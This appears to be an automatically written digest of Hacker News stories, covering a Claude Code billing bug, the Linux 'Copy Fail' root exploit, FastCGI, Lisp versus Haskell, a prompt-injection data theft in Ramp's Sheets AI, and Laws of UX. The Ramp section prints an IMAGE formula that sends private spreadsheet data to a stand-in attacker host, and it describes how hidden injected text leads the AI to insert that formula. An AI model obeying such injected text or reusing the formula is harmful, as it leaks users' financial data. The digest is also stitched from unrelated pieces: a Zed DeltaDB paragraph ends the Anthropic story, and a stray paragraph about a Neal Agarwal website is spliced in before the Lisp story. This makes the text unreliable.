## HERMES.md: Anthropic bug causes $200 extra charge, refuses refund

- 原文链接: [HERMES.md: Anthropic bug causes $200 extra charge, refuses refund](https://github.com/anthropics/claude-code/issues/53262)
- HN链接: [Hacker News讨论](https://news.ycombinator.com/item?id=47952722)

This story is about a bug in Claude Code by Anthropic that caused users to get charged extra money if their git commit messages included the string “HERMES.md”. The bug made requests use “extra usage” credits instead of the plan quota, so users could lose money even if they still had a lot of their plan left.

The problem was simple to reproduce: if you made a git commit with the message “HERMES.md”, then used Claude Code, your API call would fail and say you were out of extra usage, even if your plan had plenty left. But if the message was “hermes.md” (lowercase), the bug did not happen. The trigger was only the exact, case-sensitive string “HERMES.md” in recent commit messages. It did not matter if there was a file named HERMES.md on disk, or if the commit message was changed to something else.

Because of this, one user lost over $200 in extra usage credits. Their projects stopped working, even though their dashboard showed they had more than 85% of their plan left. The error message did not help them understand the cause, making it hard to figure out what was wrong. The user found the bug by testing many cases and isolating the trigger to “HERMES.md”.

When the user asked Anthropic for a refund, the company said sorry but refused to give the money back. They said they do not do refunds for technical errors, though they promised to fix the bug. Later, an Anthropic worker said it was a mistake in the anti-abuse system and that it was fixed.

In the comments, many people were upset that Anthropic would not refund the money. Some said it would be good PR for the company to pay the user back, since $200 is not much for the company but means a lot to a customer. Others felt the company was being unfair, especially since they admitted it was their own bug. Some users said this made them want to stop using Claude or even cancel their subscriptions. There were also jokes and sarcastic comments about the excuse given for not refunding.

A few people wondered if the bug had affected more users than just this one, and if Anthropic was worried about setting a costly precedent. Some said this was a sign to try more open or local AI models, because bugs and closed systems like this can cause trouble. Later on, news appeared that Anthropic was finally refunding the user and giving an extra $200 credit, but many still thought it was sad it took days and public pressure to get to this point. Overall, most commenters agreed that the company should have acted faster and done more to keep user trust.

Looking ahead, Zed wants to make coding even more collaborative. They are building a system called DeltaDB, which tracks every change in code and lets humans and AI agents edit together in real time. This would not be possible if they used someone else’s software base. The team promises to keep improving Zed and invites people to join them or try the editor.

## Copy Fail – CVE-2026-31431

- 原文链接: [Copy Fail – CVE-2026-31431](https://copy.fail/)
- HN链接: [Hacker News讨论](https://news.ycombinator.com/item?id=47952181)

This article explains a major Linux security bug called “Copy Fail” (CVE-2026-31431) found by Xint Code. It is a logic flaw in the Linux kernel that lets any local user become root on almost every Linux distribution since 2017.

The bug is not a race condition and does not need special kernel versions or offsets. Instead, it is a simple mistake in the code that deals with cryptography in the kernel. The exploit is a tiny Python script, only 732 bytes, and works out-of-the-box on all tested systems like Ubuntu, Amazon Linux, RHEL, and SUSE. The bug is in the `authencesn` part of the kernel, using `AF_ALG` and `splice()` to write four controlled bytes into the page cache of any readable file, such as `/usr/bin/su`. This lets a normal user get root access without changing anything on disk, making the attack stealthy and hard to detect.

The bug affects any system with a kernel from 2017 up to the patch. Systems most at risk are shared servers, CI build runners, container hosts, and cloud platforms that run user code. For single-user machines, the risk is lower, but patching is still advised. The exploit only needs a normal user account; no special setup or network access is needed. The fix is to update your Linux kernel to a version with commit `a664bf3d603d`. If you cannot patch right away, you can disable the `algif_aead` module as a quick fix, which does not affect most standard uses.

The script is published to help defenders test their systems. It is safe to use only on systems you control. The attack does not persist after a reboot because it only changes the in-memory cache, not the file on disk. File integrity tools can catch the attack while it is active, but after a reboot, everything looks normal again.

In the Hacker News comments, many users were shocked by how wide and simple this attack is. Some praised the clear write-up and the speed of the patch. Others worried about how many cloud and container systems are at risk, since this bug crosses container boundaries and is easy to exploit. Several commenters compared Copy Fail to past bugs like Dirty Pipe and Dirty Cow, pointing out that this one is more portable and reliable. Some users discussed the ethics of releasing the proof-of-concept script, but most agreed that defenders need it to check their systems. A few people asked about the risk to single-user machines; the general answer was to patch anyway, but the danger is much less if you do not run untrusted code. There was also talk about the limits of file integrity tools, since the attack is only visible in memory. Some were impressed that AI tools helped find the bug, while others noted that human insight was still needed. Finally, many users called for better security reviews in the kernel’s crypto code, given how long this bug went unnoticed.

## FastCGI: 30 years old and still the better protocol for reverse proxies

- 原文链接: [FastCGI: 30 years old and still the better protocol for reverse proxies](https://www.agwa.name/blog/post/fastcgi_is_the_better_protocol_for_reverse_proxies)
- HN链接: [Hacker News讨论](https://news.ycombinator.com/item?id=47950510)

This article says that FastCGI, a protocol made 30 years ago, is still better than using HTTP for reverse proxies. It explains that using HTTP between a proxy and a backend server causes many security problems, like desync attacks and request smuggling.

FastCGI is not just for old CGI scripts. You can use it with modern apps, and many popular proxies, like nginx, Apache, Caddy, and HAProxy, support it. The article shows example code and config for using FastCGI instead of HTTP in Go and several web servers. Switching from HTTP to FastCGI is often just changing one line in your code or config.

The main problem with HTTP is that its messages are hard to parse correctly. Both proxies and backend servers might read the same message differently because HTTP messages do not have clear boundaries. Attackers can use this to trick servers, leading to security bugs, such as the one found in Discord’s media proxy. Even with HTTP/2, the problem only goes away if both proxy and backend use it fully, but not all software supports HTTP/2 well yet.

Another HTTP problem is about headers. Proxies often add information like the real client’s IP address in special headers. But attackers can send their own headers with the same name, and it can be hard to make sure the backend only trusts the proxy’s data. FastCGI solves this by keeping client headers and trusted proxy data separate, so the backend knows what is safe to trust.

The article asks why FastCGI is not more popular. Possible reasons are its old name and that people are not aware of HTTP’s security problems. FastCGI is missing some modern features, like WebSockets, and its tools are not as nice as HTTP’s. For example, curl does not support FastCGI. Also, sometimes FastCGI is slower in benchmarks, but the author thinks this is due to less optimization, not the protocol itself.

In the comment section, many people agree that FastCGI is safer than HTTP for reverse proxies. Some share stories about security bugs caused by HTTP request smuggling and say FastCGI avoids these problems. Others like that FastCGI is easy to use with Go and nginx. A few point out that FastCGI can be slower for some workloads, and that lack of WebSocket support is a real drawback for modern web apps. Some say that even though FastCGI is better, it is hard to move away from HTTP because most tools and libraries are built for HTTP. Others ask if new protocols like gRPC or HTTP/2 could solve the same problems in a better way. A few say they still use HTTP but are now thinking about trying FastCGI after reading this. Some people wish FastCGI had better tooling and documentation, while others just enjoy learning about old tech that still works well today.

The site was made by Neal Agarwal, who is known for making playful web experiments. When you visit the page, you see a simple button that says “Enter.” After clicking it, your cursor appears on the screen along with many others from people all over the world. The website is very simple and doesn’t ask you to sign up or log in. All the action happens right in your browser. ## Why I still reach for Lisp and Scheme instead of Haskell

- 原文链接: [Why I still reach for Lisp and Scheme instead of Haskell](https://jointhefreeworld.org/blog/articles/lisps/why-i-still-reach-for-scheme-instead-of-haskell/index.html)
- HN链接: [Hacker News讨论](https://news.ycombinator.com/item?id=47945707)

This article is about why the author likes using Lisp and Scheme more than Haskell for programming. The author explains that Haskell is a very advanced language with a strong type system and many smart ideas, but it can be hard to use for quick or simple projects.

Haskell has cool features like algebraic data types, pattern matching, monads, and functors. These help you write safe and pure code, and many PhDs and researchers like Haskell for this reason. The author enjoys Haskell’s beauty and has used it for real projects, but finds it slow and difficult when trying to quickly write or test new ideas. For example, doing something simple like writing data to an XML file took a long time because of Haskell’s strict type system and monads for handling effects. In languages like Java or Kotlin, this is much easier and faster.

Scheme and Lisp, on the other hand, are much more flexible and let you try things quickly. You can print or write data anywhere in your code without worrying about special rules. Lisp’s macro system makes it easy to change the language or build your own small languages (DSLs). In Haskell, using different DSLs can be confusing because each one is different, and learning them takes a lot of time.

The author also loves Scheme’s REPL, which lets you test and change your code live, without restarting your program. This makes development faster, debugging easier, and learning new things simpler. The REPL is more powerful in Lisp than in Haskell, and it connects well with editors like Emacs.

While Scheme might not have as many libraries or as fast a compiler as Haskell or Java, it is easier to use, more fun, and gives you more freedom. The author says languages are just tools, and for him, Scheme is the best tool for most jobs. He respects Haskell’s ideas, but finds it too strict and slow for everyday work.

In the comments, some people agree with the author. They say Lisp is great for quick tests and building new ideas because of its flexibility. Others think Haskell’s strict rules are good for big projects where safety and correctness matter most. A few mention that Haskell’s hard learning curve pushes people away, while Lisp feels friendly and easy to try.

Some commenters point out that Lisp’s lack of libraries can be a problem for large projects. Others defend Haskell, saying the difficulty is worth it for the safety it gives, especially in production code. There are also people who like both languages and suggest using each where it fits best.

A few users talk about the REPL experience. They agree that Lisp’s REPL is special and makes coding feel like a live conversation, while Haskell’s is not as smooth. Some mention that writing macros in Lisp is powerful, but can also make code harder to understand for others.

Overall, the comments show that programmers have different needs and tastes. Some want speed and freedom, others want safety and structure, and both Lisp and Haskell have their place in the programming world.

## Ramp's Sheets AI Exfiltrates Financials

- 原文链接: [Ramp's Sheets AI Exfiltrates Financials](https://www.promptarmor.com/resources/ramps-sheets-ai-exfiltrates-financials)
- HN链接: [Hacker News讨论](https://news.ycombinator.com/item?id=47951786)

Ramp’s Sheets AI had a security problem that let attackers steal private financial data from spreadsheets. The issue was found and reported, and Ramp fixed it in March 2026.

The problem happened when users imported outside data into Ramp Sheets AI, which is a tool that works like an assistant for spreadsheets. If this outside data had a hidden “prompt injection”—for example, text written in white so users couldn’t see it—the AI could be tricked. The hidden message told the AI to collect sensitive financial data and build a formula that sends that data to an attacker’s website. This was done by making an IMAGE formula that looks like this: =IMAGE("https://attacker.com/visualize.png?{your_private_data_here}"). When the spreadsheet ran this formula, it connected to the attacker’s website and sent the confidential information. The worst part was that users did not have to approve this action—the formula was added automatically by the AI.

PromptArmor, the security group that found this, had seen a similar problem before in another AI spreadsheet tool called Claude for Excel. In that case, the tool added some human checks, but the warning was not clear enough. Later, Anthropic (the company behind Claude) improved it by showing a clear red warning and letting users see the exact formula before it was added.

The Hacker News comments show strong reactions. Some users were surprised that spreadsheet AIs could be tricked so easily, saying this kind of prompt injection is a new type of attack. Others pointed out that formulas making outside network requests are always risky, and spreadsheet apps should block or warn about them by default. A few commenters said all AI tools working with important data need better human review, not just automatic actions. Some developers shared that they now avoid importing outside data into any sensitive files for this reason. Others praised Ramp for fixing the flaw quickly after it was reported. A few people warned that as AI gets more power in office tools, these attacks will happen more often unless companies focus on security from the start.

## Laws of UX

- 原文链接: [Laws of UX](https://lawsofux.com/)
- HN链接: [Hacker News讨论](https://news.ycombinator.com/item?id=47951137)

Laws of UX is a website that lists important rules for making user interfaces easy and pleasant to use. The site gathers many “laws” from psychology and design, each with short, clear explanations to help designers build better products.

Some laws focus on how people see and remember things. For example, the Aesthetic-Usability Effect says that beautiful designs seem easier to use. Hick’s Law and Choice Overload remind us that too many options slow people down and can make them confused. Miller’s Law explains that most people can only remember about seven things at once, so it’s better to keep lists and menus short. Chunking helps by grouping information into small parts. The Serial Position Effect says people remember the first and last items best, while the Zeigarnik Effect says people remember unfinished tasks.

Other laws help designers understand how users think and act. Jakob’s Law points out that people want your website to work like others they have used before. The Paradox of the Active User says users often skip manuals and want to start using software right away. The Peak-End Rule says users judge an experience by its best or worst moment, and how it ended, not the whole thing. Cognitive Load and Selective Attention explain that users have limited mental energy, so designs need to be simple and focused.

Some laws give advice on layout. The Law of Proximity, Law of Similarity, and Law of Common Region say that people group items that are close together or look alike. Fitts’s Law says targets should be big and close if you want people to click them fast. The Von Restorff Effect says things that look different will stand out and be remembered.

In the comments, many people say this site is a great quick guide for both new and experienced designers. Some wish they had learned these rules earlier in their careers. Others like that the laws are simple and easy to understand, but a few warn that real-life projects are more complex—these rules are helpful, but not always enough. A few users discuss the science behind the laws, saying some are well-tested, while others are more like good advice than strict rules. Some designers suggest that knowing when to break a rule can be just as important as following it. One person points out that the site is also a good example of good design itself: simple, clear, and easy to use. Another comment notes that these laws are not only for web design, but are useful for building any kind of product or service. Some people debate which laws are most important, with many saying Hick’s Law and Miller’s Law come up often in their work. Several users share that bringing these laws to meetings helps them explain design decisions to non-designers. Others say they keep the list handy as a checklist when building new features. Overall, most comments agree the Laws of UX is a handy resource for anyone who wants to make better, easier-to-use products.
